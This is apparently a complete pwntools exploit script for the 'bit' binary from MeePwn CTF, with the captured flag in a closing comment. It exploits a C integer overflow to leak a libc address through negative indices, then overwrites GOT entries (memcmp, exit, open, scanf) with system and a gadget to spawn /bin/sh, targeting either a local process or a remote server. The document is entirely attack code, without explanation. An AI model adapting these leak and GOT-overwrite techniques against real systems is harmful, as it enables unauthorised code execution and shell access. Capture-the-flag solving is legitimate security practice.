#!/usr/bin/env python2

from pwn import *

###

if len(sys.argv) > 1:
    DEBUG = False
    libc = ELF('libc.so.6')
else:
    DEBUG = True
    libc = ELF('/lib/i386-linux-gnu/i686/cmov/libc.so.6')

context.log_level = 'info'
context.bits = 32
context.arch = 'i386'
context.endian = 'little'
context.os = 'linux'

###

if DEBUG:
    r = process('./bit')
else:
    r = remote('128.199.135.210', 31335)

GDB = False
if GDB and DEBUG:
    gdb.attach(r, 'b *0x080485DB')
r.recvuntil('password:\n')
r.sendline('A')
r.recvuntil('user_id:')
r.sendline('-2147483648')
r.recvuntil('to sort ?\n')
r.sendline('127')
for i in xrange(127):
    r.sendline('50')
r.recvuntil('to break\n')
r.sendline('-21')
l = int(r.recvline().rstrip(), 16)
libcbase = l - libc.symbols['read']
log.info('leak: %#x' % l)
log.info('libcbase: %#x' % libcbase)
r.sendline('-1')
r.recvuntil('to find\n')
r.sendline('0x6fffffff')

for x in xrange(22):
    r.recvuntil('edit it ?\n')
    r.sendline('')
r.recvuntil('edit it ?\n')
r.sendline('y')
r.recvuntil('new value')
r.sendline(str(libcbase + libc.symbols['system'])) # rewrite got.memcmp

r.recvuntil('edit it ?\n')
r.sendline('') # puts
r.recvuntil('edit it ?\n')
r.sendline('y')
r.recvuntil('new value')
r.sendline(str(libcbase + libc.symbols['system'])) # got.exit => mov [ebp+fd], eax
r.recvuntil('edit it ?\n')
r.sendline('y') # open
r.recvuntil('new value')
if DEBUG:
    r.sendline(str(libcbase + 0x0002ed8c)) # xor eax, eax ; ret
else:
    r.sendline(str(libcbase + 0x0002c92c)) # xor eax, eax ; ret
r.recvuntil('edit it ?\n')
r.sendline('') # libc_start_main
r.recvuntil('edit it ?\n')
r.sendline('') # setvbuf
r.recvuntil('edit it ?\n')
r.sendline('y') # iso_scan_f
r.recvuntil('new value')
r.sendline(str(0x080485DB)) # got.__iso_scanf => push 0
r.recvuntil('edit it ?\n')
r.sendline('y')
r.recvuntil('new value')
r.send('/bin/sh\x00')
r.recvuntil('password:\n')
r.send('/bin/sh\x00')

r.interactive()
r.close()

# MeePwnCTF{C_1n73g3r_0v3v3rFl0w}
